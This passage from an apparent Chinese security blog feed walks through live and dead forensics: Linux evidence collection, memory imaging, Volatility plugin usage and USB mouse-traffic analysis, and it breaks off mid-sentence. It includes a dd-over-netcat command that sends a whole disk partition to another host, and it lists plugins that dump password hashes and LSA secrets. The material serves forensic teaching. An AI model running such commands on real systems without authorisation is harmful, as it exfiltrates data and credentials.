src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-15_1.png" class="" title="2024-04-03_16-15_1.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-15.png" class="" title="2024-04-03_16-15.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><img src="/2024/04/03/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%93%B6%E7%8B%90%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-04-03_16-25.png" class="" title="2024-04-03_16-25.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>end.</p>]]></content>
    
    
    <categories>
      
      <category>逆向工程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>样本分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>取证闲谈</title>
    <link href="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/"/>
    <url>/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊到取证，可以分为活取证和死取证，我们通常所说的活取证是指在主机存活时发现系统被入侵,直接快速的把机器的运行内存dump下来，对运行内存进行分析取证，手机犯罪证据；而死取证通常是指对机器的磁盘做镜像之后分析的取证方法，用于在关机后制作硬盘镜像,通过分析镜像来做取证工作，相比于死取证,活取证是更加的重要,能够获取到当前系统第一手资料与证据,对于整个案件起到了至关重要的作用。一般情况下，在案件现场中，大多数还是windows系统的普通机器，不论是个人笔记本还是办公机房主机等等，但是涉案如果是服务器，则大多数可能以linux系统为主，并且如果现场涉案机器是关机状态下直接做磁盘镜像等操作就可以，但如果是开机状态下，在保护现场的情况下，还要考虑提取系统的网络、进程等数据，以及制作内存镜像等操作</p><h2 id="Linux服务器取证"><a href="#Linux服务器取证" class="headerlink" title="Linux服务器取证"></a>Linux服务器取证</h2><p>首先需要提取系统的网络，进程，日志等数据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">提取所有的IPv4、v6数据：lsof -i&gt;lsof-<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.txt</span><br>提取所有的进程数据：lsof -K&gt;lsof-K<span class="hljs-selector-class">.txt</span><br>截获当前正在运行的机器<span class="hljs-number">1000</span>帧（根据实际情况而定）数据包：tcpdump -<span class="hljs-selector-tag">i</span> any -c <span class="hljs-number">1000</span> -w capture01.cap<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-203116.png" class="" title="2024-03-24-203116.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_10-37.png" class="" title="2024-03-25_10-37.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_10-38.png" class="" title="2024-03-25_10-38.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">打包/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>下的所有数据：tar -zcPf <span class="hljs-keyword">var</span>-<span class="hljs-built_in">log</span>.tar /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span><span class="hljs-comment">/*</span><br><span class="hljs-comment">打包root用户：tar -zcPf bash-history.tar /root/.bash_history</span><br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-203321.png" class="" title="2024-03-24-203321.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>然后需要采集设备的内存镜像，如果是CentOS,Red Hat系列的Linux系统，推荐使用LiME，它是是一种可加载的内核模块（LKM），如果是Debian和Ubuntu系列的Linux系统，推荐使用fmem<br>LiME下载地址：<a href="https://github.com/504ensicsLabs/LiME">https://github.com/504ensicsLabs/LiME</a><br>fmem下载地址：<a href="https://github.com/NateBrune/fmem">https://github.com/NateBrune/fmem</a></p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-203510.png" class="" title="2024-03-24-203510.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-46.png" class="" title="2024-03-25_11-46.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>最后制作设备的磁盘镜像，可以使用dd进行制作，不过dd只能做raw格式的镜像文件，并且需要考虑磁盘的剩余空间，如果空间不足可以保存到外置的USB设备里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、本地取数据<br><br>fdisk -l    <span class="hljs-comment"># 查看磁盘及分区</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=需要拷贝的磁盘 of=/存储目录/镜像文件 （确保存储目录有足够的空间） <span class="hljs-comment"># 获取整个磁盘镜像文件</span><br><br>2、远程取硬盘数据<br><br><span class="hljs-comment"># 取证机器 B 上运行</span><br>nc -l -p 4445 | <span class="hljs-built_in">dd</span> of=/tmp/sda2.<span class="hljs-built_in">dd</span><br><br><span class="hljs-comment"># 受害机器 A 上执行传输，即可完成从受害机器 A 克隆 sda 硬盘到取证机器 B 的任务：</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/sda2 | nc 192.168.10.11 4445<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25-125841.png" class="" title="2024-03-25-125841.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>也可以使用ftkimager，可以制作DD和E01格式的镜像文件<br>工具下载地址<a href="https://accessdata.com/product-download">https://accessdata.com/product-download</a></p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_13-01.png" class="" title="2024-03-25_13-01.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>接下来聊聊内存取证，获取到物理内存之后,接下来的工作就是要对镜像文件进行取证分析，从中提取有用的证据，常使用的工具是Volatility，Volatility是一款开源的，并且基于Python开发的内存取证工具集，可以分析内存中的各种数据，Volatility支持对32位或64位Wnidows、Linux、Mac、Android操作系统的RAM数据进行提取与分析，下面是一些常用的命令参数</p><p>imageinfo：识别操作系统、服务包以及硬件架构（32位或64位），并且还能收集DTB地址和样本收集的时间等</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-01.png" class="" title="2024-03-25_14-01.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>kpcrscan：扫描潜在的KPCR（内核进程控制区域）结构，在多核系统中，每个处理器都有自己的KPCR，所以通过kpcrscan，可以看到每个处理器的详细信息，包括IDT（中断描述符表）和GDT（全局描述符表）地址；以及当前、空闲和下一个线程；CPU编号、供应商和速度；以及CR3值等等</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-25.png" class="" title="2024-03-25_14-25.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>pslist：可以提取系统中的进程，这个命令会遍历由 PsActiveProcessHead指向的双向链表，并显示进程的偏移量、进程名称、进程ID、父进程ID、线程数量、句柄数量以及进程启动和退出的日期&#x2F;时间等</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-28.png" class="" title="2024-03-25_14-28.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>psscan：可以枚举进程，不过和pslist相比，可以找到之前已终止（非活动）的进程以及被rootkit隐藏或解除链接的进程</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-29.png" class="" title="2024-03-25_14-29.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>dlllist：提取进程加载的DLL列表</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-31.png" class="" title="2024-03-25_14-31.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>getsids：可以查看与进程关联的SID（安全标识符），可以帮助识别恶意提升权限的进程以及属于特定用户的进程</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-33.png" class="" title="2024-03-25_14-33.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>cmdscan：用于了解攻击者在受害者系统上的行为</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-34.png" class="" title="2024-03-25_14-34.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>consoles：用于查找攻击者在cmd.exe中输入或通过后门执行的命令，相比于cmdscan，不仅打印出攻击者输入的命令，还可以收集整个屏幕缓冲区（输入和输出）</p><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>modscan：可以扫描物理内存中的池标记来查找 LDR_DATA_TABLE_ENTRY结构，有助于捕获之前卸载的驱动程序以及被rootkits隐藏&#x2F;解除链接的驱动程序</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-42.png" class="" title="2024-03-25_14-42.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>filescan：用于查找文件</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-44.png" class="" title="2024-03-25_14-44.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>connections：可以查看在内存获取时处于活动状态的TCP连接</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-45.png" class="" title="2024-03-25_14-45.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>hivescan：查找内存中注册表文件的物理地址</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-47.png" class="" title="2024-03-25_14-47.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>hivelist：用于定位内存中注册表文件的虚拟地址以及相应文件在磁盘上的完整路径</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-48.png" class="" title="2024-03-25_14-48.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>printkey：提取注册表键中的子键、值、数据和数据类型</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-50.png" class="" title="2024-03-25_14-50.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>总之，Volatility命令参数很多，功能强大，不再一一演示</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Usage: Volatility - A memory forensics analysis platform.<br><br>Options:<br>  -h, --help            list all available options <span class="hljs-keyword">and</span> their<span class="hljs-built_in"> default </span>values.<br>                       <span class="hljs-built_in"> Default </span>values may be <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> the configuration file<br>                        (/etc/volatilityrc)<br>  <span class="hljs-attribute">--conf-file</span>=/home/liuty/.volatilityrc<br>                       <span class="hljs-built_in"> User </span>based configuration file<br>  -d, --<span class="hljs-built_in">debug</span>           <span class="hljs-built_in">Debug</span> volatility<br>  <span class="hljs-attribute">--plugins</span>=PLUGINS     Additional plugin directories <span class="hljs-keyword">to</span> use (colon separated)<br>  --<span class="hljs-built_in">info</span>                <span class="hljs-built_in">Print</span> information about all registered objects<br>  <span class="hljs-attribute">--cache-directory</span>=/home/liuty/.cache/volatility<br>                        Directory where cache files are stored<br>  --cache               Use caching<br>  <span class="hljs-attribute">--tz</span>=TZ               Sets the (Olson) timezone <span class="hljs-keyword">for</span> displaying timestamps<br>                        using pytz (<span class="hljs-keyword">if</span> installed) <span class="hljs-keyword">or</span> tzset<br>  -f FILENAME, <span class="hljs-attribute">--filename</span>=FILENAME<br>                        Filename <span class="hljs-keyword">to</span> use when opening an image<br>  <span class="hljs-attribute">--profile</span>=WinXPSP2x86<br>                        Name of the<span class="hljs-built_in"> profile </span><span class="hljs-keyword">to</span> load (use --<span class="hljs-built_in">info</span> <span class="hljs-keyword">to</span> see a list<br>                        of supported profiles)<br>  -l LOCATION, <span class="hljs-attribute">--location</span>=LOCATION<br>                        A URN location <span class="hljs-keyword">from</span> which <span class="hljs-keyword">to</span> load an<span class="hljs-built_in"> address </span>space<br>  -w, --write           <span class="hljs-built_in">Enable</span> write support<br>  <span class="hljs-attribute">--dtb</span>=DTB             DTB<span class="hljs-built_in"> Address</span><br><span class="hljs-built_in"></span>  <span class="hljs-attribute">--shift</span>=SHIFT         Mac KASLR shift<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span>  <span class="hljs-attribute">--output</span>=text         Output <span class="hljs-keyword">in</span> this format (support is module specific, see<br>                        the Module Output Options below)<br>  <span class="hljs-attribute">--output-file</span>=OUTPUT_FILE<br>                        Write output <span class="hljs-keyword">in</span> this file<br>  -v, --verbose         Verbose information<br>  <span class="hljs-attribute">--physical_shift</span>=PHYSICAL_SHIFT<br>                        Linux kernel physical shift<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span>  <span class="hljs-attribute">--virtual_shift</span>=VIRTUAL_SHIFT<br>                        Linux kernel virtual shift<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span>  -g KDBG, <span class="hljs-attribute">--kdbg</span>=KDBG  Specify a KDBG virtual<span class="hljs-built_in"> address </span>(Note: <span class="hljs-keyword">for</span> 64-bit<br>                        Windows 8 <span class="hljs-keyword">and</span> above this is the<span class="hljs-built_in"> address </span>of<br>                        KdCopyDataBlock)<br>  --force               Force utilization of suspect<span class="hljs-built_in"> profile</span><br><span class="hljs-built_in"></span>  <span class="hljs-attribute">--cookie</span>=COOKIE       Specify the<span class="hljs-built_in"> address </span>of nt!ObHeaderCookie (valid <span class="hljs-keyword">for</span><br>                        Windows 10 only)<br>  -k KPCR, <span class="hljs-attribute">--kpcr</span>=KPCR  Specify a specific KPCR<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span><br>        Supported Plugin Commands:<br><br>                amcache         <span class="hljs-built_in">Print</span> AmCache information<br>                apihooks        Detect API hooks <span class="hljs-keyword">in</span> process <span class="hljs-keyword">and</span> kernel memory<br>                atoms           <span class="hljs-built_in">Print</span> session <span class="hljs-keyword">and</span> window station atom tables<br>                atomscan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> atom tables<br>                auditpol        Prints out the Audit Policies <span class="hljs-keyword">from</span> HKLM\SECURITY\Policy\PolAdtEv<br>                bigpools        Dump the big<span class="hljs-built_in"> page </span>pools using BigPagePoolScanner<br>                bioskbd         Reads the keyboard buffer <span class="hljs-keyword">from</span> Real Mode memory<br>                cachedump       Dumps cached domain hashes <span class="hljs-keyword">from</span> memory<br>                callbacks       <span class="hljs-built_in">Print</span> system-wide notification routines<br>                clipboard       Extract the contents of the windows clipboard<br>                cmdline         Display process command-line arguments<br>                cmdscan         Extract command history by scanning <span class="hljs-keyword">for</span> _COMMAND_HISTORY<br>                connections     <span class="hljs-built_in">Print</span> list of open connections [Windows XP <span class="hljs-keyword">and</span> 2003 Only]<br>                connscan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> tcp connections<br>                consoles        Extract command history by scanning <span class="hljs-keyword">for</span> _CONSOLE_INFORMATION<br>                crashinfo       Dump crash-dump information<br>                deskscan        Poolscaner <span class="hljs-keyword">for</span> tagDESKTOP (desktops)<br>                devicetree      Show device tree<br>                dlldump         Dump DLLs <span class="hljs-keyword">from</span> a process<span class="hljs-built_in"> address </span>space<br>                dlllist         <span class="hljs-built_in">Print</span> list of loaded dlls <span class="hljs-keyword">for</span> each process<br>                driverirp       Driver IRP hook detection<br>                drivermodule    Associate driver objects <span class="hljs-keyword">to</span> kernel modules<br>                driverscan     <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> driver objects<br>                dumpcerts       Dump RSA private <span class="hljs-keyword">and</span> public SSL keys<br>                dumpfiles       Extract memory mapped <span class="hljs-keyword">and</span> cached files<br>                dumpregistry    Dumps registry files out <span class="hljs-keyword">to</span> disk<br>                editbox         Displays information about <span class="hljs-built_in">Edit</span> controls. (Listbox experimental.)<br>                envars          Display process environment variables<br>                eventhooks      <span class="hljs-built_in">Print</span> details on windows event hooks<br>                evtlogs         Extract Windows Event Logs (XP/2003 only)<br>                filescan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> file objects<br>                gahti           Dump the<span class="hljs-built_in"> USER </span>handle<span class="hljs-built_in"> type </span>information<br>                gditimers       <span class="hljs-built_in">Print</span> installed GDI timers <span class="hljs-keyword">and</span> callbacks<br>                gdt             Display Global Descriptor Table<br>                getservicesids  <span class="hljs-built_in">Get</span> the names of services <span class="hljs-keyword">in</span> the Registry <span class="hljs-keyword">and</span> return Calculated SID<br>                getsids         <span class="hljs-built_in">Print</span> the SIDs owning each process<br>                handles         <span class="hljs-built_in">Print</span> list of open handles <span class="hljs-keyword">for</span> each process<br>                hashdump        Dumps passwords hashes (LM/NTLM) <span class="hljs-keyword">from</span> memory<br>                hibinfo         Dump hibernation file information<br>                hivedump        Prints out a hive<br>                hivelist        <span class="hljs-built_in">Print</span> list of registry hives.<br>                hivescan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> registry hives<br>                hpakextract     Extract physical memory <span class="hljs-keyword">from</span> an HPAK file<br>                hpakinfo        <span class="hljs-built_in">Info</span> on an HPAK file<br>                idt             Display Interrupt Descriptor Table<br>                iehistory       Reconstruct Internet Explorer cache / history<br>                imagecopy       Copies a physical<span class="hljs-built_in"> address </span>space out as a<span class="hljs-built_in"> raw </span>DD image<br>                imageinfo       Identify information <span class="hljs-keyword">for</span> the image<br>                impscan         Scan <span class="hljs-keyword">for</span> calls <span class="hljs-keyword">to</span> imported functions<br>                joblinks        <span class="hljs-built_in">Print</span> process job link information<br>                kdbgscan        Search <span class="hljs-keyword">for</span> <span class="hljs-keyword">and</span> dump potential KDBG values<br>                kpcrscan        Search <span class="hljs-keyword">for</span> <span class="hljs-keyword">and</span> dump potential KPCR values<br>                ldrmodules      Detect unlinked DLLs<br>                lsadump         Dump (decrypted) LSA secrets <span class="hljs-keyword">from</span> the registry<br>                machoinfo       Dump Mach-O file format information<br>                malfind         <span class="hljs-built_in">Find</span> hidden <span class="hljs-keyword">and</span> injected code<br>                mbrparser       Scans <span class="hljs-keyword">for</span> <span class="hljs-keyword">and</span> parses potential Master Boot Records (MBRs)<br>                memdump         Dump the addressable memory <span class="hljs-keyword">for</span> a process<br>                memmap          <span class="hljs-built_in">Print</span> the memory map<br>                messagehooks    List desktop <span class="hljs-keyword">and</span> thread window message hooks<br>                mftparser       Scans <span class="hljs-keyword">for</span> <span class="hljs-keyword">and</span> parses potential MFT entries<br>                moddump         Dump a kernel driver <span class="hljs-keyword">to</span> an executable file sample<br>                modscan        <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> kernel modules<br>                modules         <span class="hljs-built_in">Print</span> list of loaded modules<br>                multiscan       Scan <span class="hljs-keyword">for</span> various objects at once<br>                mutantscan     <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> mutex objects<br>                notepad         List currently displayed notepad text<br>                objtypescan     Scan <span class="hljs-keyword">for</span> Windows object<span class="hljs-built_in"> type </span>objects<br>                patcher         Patches memory based on<span class="hljs-built_in"> page </span>scans<br>                poolpeek        Configurable<span class="hljs-built_in"> pool </span>scanner plugin<br>                printkey        <span class="hljs-built_in">Print</span> a registry key, <span class="hljs-keyword">and</span> its subkeys <span class="hljs-keyword">and</span> values<br>                privs           Display process privileges<br>                procdump        Dump a process <span class="hljs-keyword">to</span> an executable file sample<br>                pslist          <span class="hljs-built_in">Print</span> all running processes by following the EPROCESS lists<br>                psscan         <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> process objects<br>                pstree          <span class="hljs-built_in">Print</span> process list as a tree<br>                psxview         <span class="hljs-built_in">Find</span> hidden processes with various process listings<br>                qemuinfo        Dump Qemu information<br>                raw2dmp         Converts a physical memory sample <span class="hljs-keyword">to</span> a windbg crash dump<br>                screenshot      Save a pseudo-screenshot based on GDI windows<br>                servicediff     List Windows services (ala Plugx)<br>                sessions        List details on _MM_SESSION_SPACE (user logon sessions)<br>                shellbags       Prints ShellBags <span class="hljs-built_in">info</span><br>                shimcache       Parses the Application Compatibility Shim Cache registry key<br>                shutdowntime    <span class="hljs-built_in">Print</span> ShutdownTime of machine <span class="hljs-keyword">from</span> registry<br>                sockets         <span class="hljs-built_in">Print</span> list of open sockets<br>                sockscan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> tcp socket objects<br>                ssdt            Display SSDT entries<br>                strings         Match physical offsets <span class="hljs-keyword">to</span> virtual addresses (may take a <span class="hljs-keyword">while</span>, VERY verbose)<br>                svcscan         Scan <span class="hljs-keyword">for</span> Windows services<br>                symlinkscan    <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> symlink objects<br>                thrdscan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> thread objects<br>                threads         Investigate _ETHREAD <span class="hljs-keyword">and</span> _KTHREADs<br>                timeliner       Creates a timeline <span class="hljs-keyword">from</span> various artifacts <span class="hljs-keyword">in</span> memory<br>                timers          <span class="hljs-built_in">Print</span> kernel timers <span class="hljs-keyword">and</span> associated module DPCs<br>                truecryptmaster Recover TrueCrypt 7.1a Master Keys<br>                truecryptpassphrase     TrueCrypt Cached Passphrase Finder<br>                truecryptsummary        TrueCrypt Summary<br>                unloadedmodules <span class="hljs-built_in">Print</span> list of unloaded modules<br>                userassist      <span class="hljs-built_in">Print</span> userassist registry keys <span class="hljs-keyword">and</span> information<br>                userhandles     Dump the<span class="hljs-built_in"> USER </span>handle tables<br>                vaddump         Dumps out the vad sections <span class="hljs-keyword">to</span> a file<br>                vadinfo         Dump the VAD <span class="hljs-built_in">info</span><br>                vadtree         Walk the VAD tree <span class="hljs-keyword">and</span> display <span class="hljs-keyword">in</span> tree format<br>                vadwalk         Walk the VAD tree<br>                vboxinfo        Dump virtualbox information<br>                verinfo         Prints out the version information <span class="hljs-keyword">from</span> PE images<br>                vmwareinfo      Dump VMware VMSS/VMSN information<br>                volshell        Shell <span class="hljs-keyword">in</span> the memory image<br>                windows         <span class="hljs-built_in">Print</span> Desktop Windows (verbose details)<br>                wintree         <span class="hljs-built_in">Print</span> Z-Order Desktop Windows Tree<br>                wndscan        <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> window stations<br>                yarascan        Scan process <span class="hljs-keyword">or</span> kernel memory with Yara signatures<br></code></pre></td></tr></table></figure><h2 id="USB流量数据取证"><a href="#USB流量数据取证" class="headerlink" title="USB流量数据取证"></a>USB流量数据取证</h2><p>关于鼠标流量取证，每个数据包的数据区有四个字节。第一个字节代表按钮。取0x00时，表示没有按钮。为0x01时，表示左键，当它是0x02时，表示当前按钮是右键，第二个字节可以被认为是带符号的字节类型，最高位是符号位，当该值为正时，表示鼠标水平向右移动多少像素，当它为负数时，表示向左移动了多少像素。第三个字节类似于第二个字节，代表垂直向上和向下移动的偏移量，我们可以先看一个数据包</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_10-14.png" class="" title="2024-03-25_10-14.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>可以看到认证等的信息，我们也可以从里面看到这个设备的信息，应该是罗技的鼠标，然后我们用tshark对usb数据进行提取</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tshark -r capture<span class="hljs-selector-class">.pcapng</span> -T fields -e usb<span class="hljs-selector-class">.capdata</span> &gt; data2.txt<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-09.png" class="" title="2024-03-25_11-09.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>可以看到数据是四个字节的，那么我们基本可以判断是usb鼠标流量，然后将第二个和第三个字节转换为坐标，并生成一个坐标文件</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-21.png" class="" title="2024-03-25_11-21.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_19-57.png" class="" title="2024-03-25_19-57.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><p>最后将数据绘制到 Gnuplot 